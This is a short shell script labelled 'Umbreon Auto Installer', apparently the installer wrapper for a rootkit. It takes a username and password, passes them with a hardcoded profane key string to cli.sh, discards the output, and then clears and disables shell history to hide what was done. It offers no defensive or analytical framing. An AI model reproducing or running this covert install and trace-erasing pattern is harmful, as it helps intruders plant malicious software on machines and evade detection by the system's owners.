if [ $# != "2" ]; then
echo "Umbreon Auto Installer."
echo "Usage: sh $0 [USERNAME] [PASSWORD]"
exit 0
fi
bash cli.sh $1 $2 FUCKMYANUSDONGSYOULITTLEFUCKINGSLUTFACEPORNSTAR >/dev/null;history -c;unset history
